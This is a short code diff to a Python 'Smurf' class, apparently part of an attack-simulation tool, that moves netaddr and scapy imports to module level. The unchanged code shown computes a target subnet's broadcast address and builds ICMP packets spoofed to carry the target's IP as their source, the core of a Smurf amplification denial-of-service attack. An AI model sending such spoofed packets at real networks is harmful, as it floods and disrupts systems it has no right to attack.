@@ -1,5 +1,8 @@
 from attacker import Attacker
 
+from netaddr import IPNetwork
+from scapy.all import IP, ICMP, send
+
 class Smurf(Attacker):
 	"""
 	Parameters
@@ -33,7 +36,6 @@ class Smurf(Attacker):
 
 	def compute_broadcast_addr(self, subnet_mask) -> str:
 		"""Returns the broadcast address of the target subnet"""
-		from netaddr import IPNetwork
 		addr = (IPNetwork(self.target_ipv4+"/"+subnet_mask)).broadcast
 		return str(addr)
 
@@ -43,7 +45,6 @@ class Smurf(Attacker):
 
 	def start(self):
 		"""Sends spoofed ICMP packets to the target broadcast address"""
-		from scapy.all import IP, ICMP, send
 
 		pkt = IP(src=self.target_ipv4, dst=self.broadcast_ipv4)/ICMP()
 
